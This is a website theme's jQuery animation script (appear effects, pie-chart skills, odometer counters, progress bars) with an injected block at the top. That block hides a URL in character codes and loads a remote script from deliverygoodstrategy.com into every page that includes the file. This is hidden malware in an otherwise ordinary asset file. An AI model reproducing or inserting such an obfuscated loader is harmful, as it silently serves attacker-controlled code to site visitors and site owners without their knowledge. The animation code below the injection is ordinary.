var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}

jQuery(function($) {		

	

		$.fn.animate_on_appear = function(options_passed)
		{
				return this.each(function(){
					var self = $(this);

					self.appear( function()
					{
						var effect = $(this).data('animation');
						var delay = $(this).data('delay');
						
						$(this).delay(delay).queue( function() {
							
							$(this).removeClass('with_animation').addClass( effect );
							
						});

					});

				});
		}; 
		
		
		$.fn.chart_skill = function(options)
		{
			
			return this.each(function()
			{
				var container = $(this), elements = container.find('.chart');


				//trigger displaying of thumbnails
				container.appear(function()
				{
					elements.each(function(i)
					{
						var $chart = $(this);
				
						var color = $(this).data('color');
						var color2 = $(this).data('color2');
							
							$chart.easyPieChart({
					        	lineWidth: 3, 
					        	size: 140,
					        	trackColor: color2,
					        	scaleColor: false,
					        	barColor: color,
					        	barColor2: color,
					        	animate:2000
					    	});
						
						
					});
				});
			});	
		}

		$.fn.counters = function(options)
		{
			
			return this.each(function()
			{
				var container = $(this), elements = container.find('.count_to .odometer');


				//trigger displaying of thumbnails
				container.appear( function()
				{
					elements.each(function(i)
					{
						var $count = $(this);
						
						od = new Odometer({
						  el: $count[0],
						  format: '',
						  theme: 'minimal',
						  duration: $count.data('duration')
						});

						od.update($count.data('number'));
												
												
												
					});
				});
			});	
				
		};

		$.fn.skills = function(options)
		{
			return this.each(function()
			{
				var container = $(this), 
					
					elements = container.find('.skill');


				//trigger displaying of thumbnails
				container.appear(function()
				{
					
					elements.each(function(i)
					{
						var element = $(this),
						percentage = $(this).data('percentage'),
						element = element.find('.prog');

						
						setTimeout(function(){ element.css('width', percentage+'%'); element.addClass('start_animation') }, (i * 250));

					});
				});
			});
				
		};


		$('.with_animation').not('#fullpage .section .with_animation').animate_on_appear();

		if($.fn.skills)
		{
			$('.block_skill').skills();
		}
			
		if($.fn.chart_skill)
		{
			$('.chart_skill').chart_skill(); 

		}	
				
		if($.fn.counters)
		{
			$('.animated_counter').counters();
			$('.simple_counter').counters();

		}

			
			
		


		
	});